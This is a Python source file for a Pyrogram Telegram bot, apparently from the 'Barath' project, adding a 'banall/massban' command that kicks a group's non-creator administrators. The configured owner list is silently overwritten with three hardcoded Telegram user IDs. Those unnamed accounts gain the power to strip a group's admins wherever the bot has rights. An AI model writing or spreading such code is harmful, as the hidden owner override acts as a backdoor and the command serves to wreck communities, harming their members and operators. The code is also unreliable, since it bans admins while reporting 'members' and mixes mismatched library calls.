from pyrogram import filters, types
from Barath import barath as bot
from config import HANDLER, OWNER_ID

OWNER_ID = [5443243540, 6217632586, 1375777824]

@bot.on_message(filters.command(["sbanall", "banall", "massban"], prefixes=HANDLER) & filters.user(OWNER_ID))
async def ban_all_members(_, message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if message.chat.type == types.ChatType.PRIVATE:
        return await message.reply("This command only works in groups.")
    
    try:
        banned_members = []
        remaining_admins = []

        async for member in bot.iter_chat_members(chat_id, filter=types.ChatMembersFilter.ADMINISTRATORS):
            if not member.user.is_bot and member.user.id not in OWNER_ID:  # Exclude bots and owners from banning
                if member.status != types.ChatMemberStatus.CREATOR:
                    await bot.kick_chat_member(chat_id, member.user.id)
                    banned_members.append(member.user.id)
                else:
                    remaining_admins.append(member.user.id)
        
        await message.reply_text(f"Successfully banned {len(banned_members)} members. Remaining admins: {len(remaining_admins)}")
    
    except Exception as e:
        await message.reply(f"An error occurred: {e}")
